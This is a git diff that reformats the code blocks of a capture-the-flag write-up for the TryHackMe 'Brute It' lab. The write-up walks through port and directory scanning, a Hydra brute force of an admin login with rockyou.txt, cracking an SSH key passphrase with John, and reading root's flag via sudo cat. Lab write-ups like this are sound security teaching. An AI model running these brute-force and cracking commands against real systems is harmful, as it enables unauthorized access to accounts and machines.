@@ -31,7 +31,8 @@ Then, I make a "`Brute-It`" folder and a "`nmap`" sub-folder where I will be sav
 
 Once we know the target machine IP, we can start a terminal an add the `target IP` and `bruteit.thm` into the `/etc/hosts` file.
 
-```sudo nano /etc/hosts
+```shell
+sudo nano /etc/hosts
 ```
 
 ![2](./_attachment/THM_Brute-It_hosts-file.png)
@@ -40,7 +41,8 @@ Once we know the target machine IP, we can start a terminal an add the `target I
 
 Let's discover what are the open ports on this target. We will use 'nmap' :  
 
-``` nmap -sV -sV -oA nmap/basic bruteit.thm -v
+```shell
+nmap -sV -sV -oA nmap/basic bruteit.thm -v
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -59,7 +61,8 @@ Let's check `http://bruteit.thm` in our browsers.  Nothing of interest here. Jus
 Are there some files and directories hidden from us on the HTTP server?
 Let's do a quick scan and get our answer. For this, I like using the tool `dirsearch`. It is perfect for a quick initial scan :
 
-``` ❯ dirsearch -u bruteit.thm
+```shell
+ ❯ dirsearch -u bruteit.thm
 
   _|. _ _  _  _  _ _|_    v0.4.2
  (_||| _) (/_(_|| (_| )
@@ -129,7 +132,8 @@ We'll do that using Hydra.  It is a nice brute forcing tool. It is fast, easy to
 
 The process of brute forcing is simple.  The tool is going to try to login using the now known `admin` user in combination with a wordlist.  In this case we are going to use `rockyou.txt` as the password dictionary.
 
-``` ❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.235.217 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V
+```shell
+ ❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.235.217 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V
 
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -186,7 +190,8 @@ The `id_rsa` is a **Private Key** file.  Those files are used as credentials to 
 
 First, let's create the **hash file** from `id_rsa`. We can use a Python script named `ssh2john.py`.  When done, let's start John and let `John` do his business:
 
-``` ❯ ssh2john id_rsa > id_rsa.hash
+```shell
+❯ ssh2john id_rsa > id_rsa.hash
 
 ❯ john id_rsa.hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -209,7 +214,8 @@ The **password** is : `rockinroll`
 
 We nee to give us ownership of the id_rsa key to be able to use it ourself.  To change the **file permission**:
 
-``` chmod 400 id_rsa
+```shell
+chmod 400 id_rsa
 ```
 
 ![6](./_attachment/THM_Brute-It_id_rsa-file-perm.png)
@@ -219,7 +225,8 @@ We can check with `ls -la` that `id_rsa` is now read-only and owned by a single 
 
 Now, it is time to use everything we have gathered so far and connect to the target using **username** `john` on the previously discovered SSH server:
 
-``` ❯ ssh -i id_rsa john@bruteit.thm
+```shell
+❯ ssh -i id_rsa john@bruteit.thm
 The authenticity of host 'bruteit.thm (10.10.150.236)' can't be established.
 ED25519 key fingerprint is SHA256:kuN3XXc+oPQAtiO0Gaw6lCV2oGx+hdAnqsj/7yfrGnM.
 This key is not known by any other names.
@@ -231,7 +238,8 @@ Enter passphrase for key 'id_rsa':
 
 And...
 
-``` Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
+```shell
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
@@ -250,7 +258,8 @@ john@bruteit:~$
 
 We are in! As john.  Check around quickly to find the `user.txt`
 
-``` john@bruteit:~$ ls
+```shell
+john@bruteit:~$ ls
 user.txt
 ```
 
@@ -258,7 +267,8 @@ user.txt
 
 Let's check what `john` is having permission to run as root using `sudo`:
 
-``` john@bruteit:~$ sudo -l
+```shell
+john@bruteit:~$ sudo -l
 Matching Defaults entries for john on bruteit:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
@@ -268,7 +278,8 @@ User john may run the following commands on bruteit:
 
 `john` can run `cat` as **root** using `sudo`.  Let's `cat` the `root.txt` flag:
 
-``` john@bruteit:~$ sudo cat /root/root.txt
+```shell
+ john@bruteit:~$ sudo cat /root/root.txt
 THM{ZZXXXZZXXXZZXXXZZXXXZZXXXZZXXX}
 john@bruteit:~$
 ```
